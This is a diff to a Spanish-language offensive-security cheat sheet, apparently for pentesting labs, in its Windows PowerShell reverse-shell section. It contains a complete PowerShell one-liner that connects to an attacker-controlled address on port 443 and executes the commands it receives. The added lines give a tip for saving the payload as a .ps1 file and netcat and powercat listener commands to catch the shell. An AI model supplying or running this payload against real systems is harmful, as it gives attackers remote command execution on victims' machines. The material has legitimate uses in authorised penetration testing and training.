@@ -103,10 +103,19 @@ Forward Shell  → via mkfifo → cuando reverse y bind están bloqueados por fi
 
 ## 3. REVERSE SHELLS — WINDOWS (POWERSHELL)
 
-### One-liner básico PowerShell
+### One-liner básico PowerShellOneLine
 ```bash
 ❯ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP_KALI>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-# Recibir con rlwrap nc -nlvp 443
+
+NOTA: Si se crea el archivo .ps1 se debe de quitar la parte de 'powershell -nop -c'
+
+
+# Recibir en Kali 
+❯ rlwrap nc -nlvp 443
+
+# Recibir en Windows 
+❯ Import-Module .\Powercat.ps1 
+❯ powercat -lpv 443
 ```
 
 ### Invoke-PowerShellTcp (Nishang)
